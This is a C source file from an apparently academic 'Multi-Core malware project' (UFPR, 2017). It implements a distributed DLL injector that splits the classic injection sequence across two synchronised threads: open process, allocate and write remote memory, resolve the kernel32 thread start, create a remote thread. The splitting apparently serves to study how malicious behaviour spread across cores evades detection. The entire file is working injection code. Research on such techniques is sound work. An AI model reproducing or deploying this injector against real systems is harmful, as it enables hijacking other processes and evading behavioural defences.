/* Multi-Core malware project
 * Distributed DLL Injector Example
 * Marcus Botacin - 2017
 * Federal University of Paraná (UFPR)
 */

/* Include block */
#include "threads.h"
#include <stdio.h>
#include "functions.h"

/* Thread 1 */
DWORD WINAPI T1( LPVOID lpParam )
{
	/* wait human to start */
	getchar();

	/* get args/params */
	pcontext ctx = (pcontext)lpParam;

	/* Get lock */
	EnterCriticalSection(&ctx->cs);
	
	/* debug print */
	printf("1. 1/6. OpenProc\n");

	/* perform action */
	ctx->proc = OPENPROC(ctx->pid);
	if(!ctx->proc)
	{
		printf("OpenProc error\n");
		exit(0);
	}

	/* release lock */
	LeaveCriticalSection(&ctx->cs);

	/* call other thread */
	WakeAllConditionVariable(&ctx->cv2);

	/* Wait other thread */
	SleepConditionVariableCS(&ctx->cv1,&ctx->cs,INFINITE);

	/* Repeat for other steps */
	EnterCriticalSection(&ctx->cs);
	printf("1. 3/6. WriteMemory\n");
	ctx->write = WRITEPROC( ctx->proc, ctx->alloc,ctx->dll, ctx->size);
	if(!ctx->write)
	{
		printf("WriteProcMem error\n");
		exit(0);
	}
	LeaveCriticalSection(&ctx->cs);
	WakeAllConditionVariable(&ctx->cv2);
	
	SleepConditionVariableCS(&ctx->cv1,&ctx->cs,INFINITE);
	EnterCriticalSection(&ctx->cs);
	printf("1. 5/6. GetThreadStart\n");
	ctx->tStart = GetThreadStart(ctx->k32);
	if(!ctx->tStart)
	{
		printf("GetThreadStart error\n");
		exit(0);
	}
	
	LeaveCriticalSection(&ctx->cs);
	
	WakeAllConditionVariable(&ctx->cv2);

	/* Fix: Hanging at this point */
	SleepConditionVariableCS(&ctx->cv2,&ctx->cs,INFINITE);

	return 0;
}

/* Thread 2 */
DWORD WINAPI T2( LPVOID lpParam )
{
	/* wait for human to start */
	getchar();

	/* The same as in thread 1 */

	pcontext ctx = (pcontext)lpParam;
	
	SleepConditionVariableCS(&ctx->cv2,&ctx->cs,INFINITE);
	EnterCriticalSection(&ctx->cs);
	printf("2. 2/6. VirtualAlloc\n");
	ctx->size= (strlen(ctx->dll)+1)*sizeof(char);
	ctx->alloc = VIRTUALALLOC(ctx->proc,ctx->size);
	if(!ctx->alloc)
	{
		printf("VirtualAlloc error\n");
		exit(0);
	}
	LeaveCriticalSection(&ctx->cs);
	WakeAllConditionVariable(&ctx->cv1);

	SleepConditionVariableCS(&ctx->cv2,&ctx->cs,INFINITE);
	EnterCriticalSection(&ctx->cs);
	printf("2. 4/6. GetModule\n");
	ctx->k32 = GetModule();
	if(!ctx->k32)
	{
		printf("GetModule error\n");
		exit(0);
	}
	LeaveCriticalSection(&ctx->cs);
	WakeAllConditionVariable(&ctx->cv1);

	SleepConditionVariableCS(&ctx->cv2,&ctx->cs,INFINITE);
	EnterCriticalSection(&ctx->cs);

	printf("2. 6/6. CreateThread\n");
	ctx->thread = CreateThread(ctx->proc,ctx->tStart,ctx->alloc);
	if(!ctx->thread)
	{
		printf("CreateThread error\n");
		exit(0);
	}

	WaitForSingleObject(ctx->thread, INFINITE);

	LeaveCriticalSection(&ctx->cs);

	return 0;
}